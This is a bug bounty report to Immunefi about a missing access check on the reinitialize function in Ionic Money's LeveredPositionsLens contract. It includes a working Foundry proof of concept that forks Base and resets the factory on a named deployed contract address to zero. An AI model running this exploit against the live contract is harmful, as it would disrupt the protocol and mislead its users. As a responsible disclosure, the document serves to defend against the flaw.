
# The reinitialize function in LeveredPositionsLens.sol lack access control protection can allow attackers to set the factory to arbitrary malicious address to cause damage to the Ionic Money protocol

Submitted on Mon Jun 17 2024 17:27:45 GMT-0400 (Atlantic Standard Time) by @perseverance for [IOP | Ionic](https://immunefi.com/bounty/ionic-iop/)

Report ID: #32301

Report type: Smart Contract

Target: https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPositionsLens.sol

Impacts:
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description
# Description

## Brief/Intro

The contracts\contracts\ionic\levered\LeveredPositionsLens.sol contract is intended to help with off-chain or web interface. In this contract, there are 2 functions to set the factory address. 

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPositionsLens.sol#L15-L21
```solidity

  function initialize(ILeveredPositionFactory _factory) external initializer {
    factory = _factory;
  }

  function reinitialize(ILeveredPositionFactory _factory) external reinitializer(2) {
    factory = _factory;
  }

```

https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/proxy/utils/Initializable.sol#L152-L174

```solidity
 modifier reinitializer(uint64 version) {
        // solhint-disable-next-line var-name-mixedcase
        InitializableStorage storage $ = _getInitializableStorage();

        if ($._initializing || $._initialized >= version) {
            revert InvalidInitialization();
        }
        $._initialized = version;
        $._initializing = true;
        _;
        $._initializing = false;
        emit Initialized(version);
    }

    /**
     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the
     * {initializer} and {reinitializer} modifiers, directly or indirectly.
     */
    modifier onlyInitializing() {
        _checkInitializing();
        _;
    }

```


## The vulnerability 
### Vulnerability Details


So the factory address is really important, because all the data is taken from that contract. 
So after creating the LeveredPositionsLens, the creator can call initialize to set the factory address. This can be done in an automation script. There is the risk that initialize transaction can be front-run if this transaction is executed on Ethereum or Layer1 with public mempool. 
But with the contracts will be deployed on Mode or Base that is Layer2 without public mempool, then it can not be front-run. So it is acceptable. 

But the reinitialize function is intended to set the factory to a new address. So this reinitialize transaction is intended to execute later when the factory needed to be updated. 
Because there is no need to reinitialize right after construction/deployment of the contract as the initialize transaction was executed to update the factory to a correct address. 

With this use case in mind, there is no access control protection for this reinitialize. So anyone or any attacker can call reinitialize to set the factory to an arbitrary address or zero. 

Since the data fetched from this contract can serve the website or automation system on backend, so by altering the factory address to a malicious address with fake data can create risk and damage for users and the Ionic Money protocol. 


# Impacts
# About the severity assessment

Attacker can call reinitialize to set the factory to an arbitrary malicious factory or zero. Since the data fetched from this contract can serve the website or automation system on backend, so by altering the factory address to a malicious address with fake data can create risk and damage for users and the Ionic Money protocol. 

After the attack, the Ionic Protocol cannot use the deployed LeveredPositionLens contract anymore. Should deploy another contract. 
The damage to the protocol also depends on where the lens will be used. 

So to use the reinitialize later should have some kind of access control.  Or just create the setFactory function with onlyAdmin role to update the factory when needed.   

Severity: Medium

Impact category: Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
        
## Proof of concept

#  Proof of concept

Step 1: Attacker can deploy or create a fake malicous factory 

Step 2: Call the reinitialize function to update the factory to the fake factory. 

In the POC, I found the deployed on Base network as the attack contract victim.
The address is taken from https://github.com/ionicprotocol/monorepo/blob/development/packages/chains/deployments/base.json 


POC code:
```solidity
interface ILeveredPositionLens {
  function reinitialize(ILeveredPositionFactory _factory) external;  
  function factory() external view returns (ILeveredPositionFactory); 
}

contract TestLeveredPositionLensBase is Test {


  function setUp() public {

      vm.createSelectFork("https://rpc.ankr.com/base", 15926702); //Jun-17-2024 04:45:51 PM +UTC 

  }

  //forge test --match-test testLeveredPositionLens --match-contract TestLeveredPositionLensBase -vvvvv | format > testLeveredPositionLens_240617_2210.log
  function testLeveredPositionLens() public {

    address LeveredPositionsLens_ = 0x5d74800e977bFc8E14Eca28C9405BacbD091738E; // address found in https://github.com/ionicprotocol/monorepo/blob/development/packages/chains/deployments/base.json


    ILeveredPositionLens lens = ILeveredPositionLens(LeveredPositionsLens_);
    console.log("Before the attack, the address of the factory: ",address(lens.factory()));
    lens.reinitialize(ILeveredPositionFactory(address(0)));
    console.log("After the attack, the address of the factory: ",address(lens.factory()));

  }

} 
```
In this POC, I demonstrated to set the factory to zero address successfully. 

Test log of the POC
```
[PASS] testLeveredPositionLens() (gas: 24471)
Logs:
  Before the attack, the address of the factory:  0x4e20eB2AF6bE30660323cB25204e071116737FEA
  After the attack, the address of the factory:  0x0000000000000000000000000000000000000000
```



Full POC: 
https://gist.github.com/Perseverancesuccess2021/f73940d6d5ac85272fba0686c33e5054

Get full test case and replace the file: contracts\contracts\test\LeveredPositionTest.t.sol 
Run command 
```
forge test --match-test testLeveredPositionLens --match-contract TestLeveredPositionLensBase -vvvvv
```

Full Log file: 

https://gist.github.com/Perseverancesuccess2021/f73940d6d5ac85272fba0686c33e5054